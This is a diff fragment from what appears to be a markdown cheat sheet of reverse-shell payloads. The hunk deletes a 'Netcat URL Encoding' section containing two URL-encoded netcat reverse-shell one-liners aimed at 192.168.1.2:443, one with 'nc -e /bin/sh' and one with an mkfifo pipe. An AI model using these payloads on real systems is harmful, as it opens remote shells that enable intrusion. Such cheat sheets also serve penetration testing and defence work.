@@ -179,16 +179,6 @@
   ```
   
   ---
-  
-  # <kbd>Netcat URL Encoding</kbd>
-  
-  ```cmd
-  nc%20-e%20%2Fbin%2Fsh%20192.168.1.2%20443
-  ```
-  
-  ```cmd
-  rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
-  ```
  
   # <kbd>Netcat Base64 Encoding</kbd>
  
